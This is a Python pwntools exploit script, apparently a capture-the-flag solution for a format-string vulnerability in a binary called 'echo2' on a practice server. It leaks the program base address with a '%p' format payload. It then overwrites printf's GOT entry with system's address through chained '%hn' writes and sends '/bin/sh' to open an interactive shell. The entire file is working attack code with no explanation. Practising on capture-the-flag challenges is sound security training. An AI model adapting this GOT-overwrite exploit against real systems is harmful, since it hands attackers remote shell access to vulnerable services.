#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./echo2")
	elf = ELF("./echo2")
else:
	p = remote('node3.buuoj.cn',26392)
	elf = ELF("./echo2")


#gdb.attach(p,'b *printf')

###leak base###

payload = 'AAA%'+str(0x1d-1+6)+'$p'
sl(payload)

ru('AAA')
base = int(rv(14),16) - 0x810

success('program base:'+hex(base))



###modify GOT###
printf_got = base + elf.got['printf']
system = base + elf.plt['system']


system_list = [0,0,0]
system_list[0] = system % 0x10000
system_list[1] = system // 0x10000 % 0x10000
system_list[2] = system //0x100000000 % 0x10000

success(hex(printf_got))
success(hex(system_list[0]) + '----' + hex(system_list[1]) + '----' + hex(system_list[2]))
pause()

payload = '%' + str(system_list[2]) + 'c%12$hn'
payload+= '%' + str(abs(system_list[1]-system_list[2])) + 'c%13$hn'
payload+= '%' + str(abs(system_list[0]-system_list[1])) + 'c%14$hn'
payload = payload.ljust(0x10*3,'A')
payload+= p64(printf_got+4) + p64(printf_got+2) + p64(printf_got+0)

sl(payload)

#gdb.attach(p,'b *fgets')

###get shell###
sl('/bin/sh\x00')
ia()